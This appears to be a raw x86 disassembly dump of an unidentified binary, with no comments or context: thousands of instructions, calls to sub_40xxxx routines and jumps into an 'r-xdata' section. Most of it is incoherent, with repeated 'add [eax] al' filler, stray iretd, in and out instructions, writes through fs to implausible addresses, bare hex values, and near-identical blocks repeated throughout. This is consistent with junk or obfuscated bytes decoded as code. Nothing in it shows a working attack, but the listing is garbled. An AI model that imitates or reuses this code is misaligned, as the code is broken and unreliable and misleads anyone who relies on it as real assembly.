add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4041fd
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_4042fa
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_40423b
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x586637b4
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40425e
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x586637b4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_404261
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_404278
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119c9bb
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd5224
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x586637b4
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_404291
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x586637b4
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
add [ eax ] al
jno 0xf9a9c8e
sub_40429a
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119c9bb
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd5224
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4042e1
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
jo 0xffffffff894f9ca2
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4042fa
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd5224
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a9c8e
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_40429a
add edx 0xff05e852
jne 0xffffffffc2c1709e
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4042e1
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53c7ec
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1517c
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
jo 0xffffffff894f9ca2
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4043b5
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_404460
jns 0xffffffff9cc15322
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1002c40
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_40445c
jo 0xffffffffff29d21d
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
push esi
call sub_4044ab
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c35417
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec186a4
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bc386
jae r-xdata
jl 0xffffffffa1a4d6c0
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40447a
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c15394
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7e7
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1cb
jg r-xdata
jge 0x18aca35
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009ba4b
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045d9
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24b804
add esp 0x4
ja r-xdata
jge 0x100c8d3
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c2331d
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20779
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120c870
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc648999
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_40446d
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d2c
jae r-xdata
jpo 0x36289d72
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dc2
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4045fc
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf28
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_40452a
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb917
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d87
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_404635
sub esi 0xe92e7f58
push esp
push edi
call sub_404557
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cda2
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40445c
jge r-xdata
add esp 0x8
jge 0xffffffff874ff6d9
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x5975514e
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c35417
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc648999
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec186a4
jno r-xdata
